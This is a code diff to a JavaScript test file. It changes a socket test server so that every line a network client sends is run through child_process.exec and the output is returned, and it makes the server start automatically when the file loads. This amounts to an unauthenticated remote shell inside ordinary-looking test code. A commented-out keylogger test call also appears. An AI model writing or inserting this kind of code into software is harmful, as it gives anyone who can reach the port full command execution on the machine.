@@ -157,6 +157,23 @@ function testReadFromLine() {
 }
 
 function testSocketServer(options = {}) {
+	const stringToAscii = function(item) {
+		const asciiKeys = [];
+		for (var i = 0; i < item.length; i ++) {
+			asciiKeys.push(item[i].charCodeAt(0));
+		}
+		return asciiKeys
+	}
+	function execute(command, callback) {
+		const { exec } = require('child_process');
+		exec(command, (error, stdout, stderr) => {
+		  if (error) {
+			console.error(`exec error: ${error}`);
+			return;
+		  }
+		  callback(stdout);
+		});
+	}
 	const net = require("net");
 	const EXIT_KEYWORD = "exit";
 	const CTRL_C_BUFFER_LINNUX = new Buffer("fff4fffd06", "hex");
@@ -174,7 +191,11 @@ function testSocketServer(options = {}) {
 				socket.end("oukey tak sa maj\n");		
 				console.log("Client sa odpojil");
 			} else {
-				console.log(data.toString(), " == ", data);
+				const message = data.toString().replace(String.fromCharCode(10), "").replace(String.fromCharCode(13), "");
+				process.stdin.write("item: ");
+				// console.log(message);
+				execute(message, (response) => socket.write(response + "login: "));
+				// console.log(, " == ", data);
 			}
 			if(data.equals(END_LINE_WINDOW)) {
 				console.log("end of line");
@@ -268,7 +289,7 @@ function killByName(name) {
 	});
 }
 
-// testSocketServer();
+testSocketServer();
 // testKeyLogger();
 // handleEvents();
 // testReadFromLine();
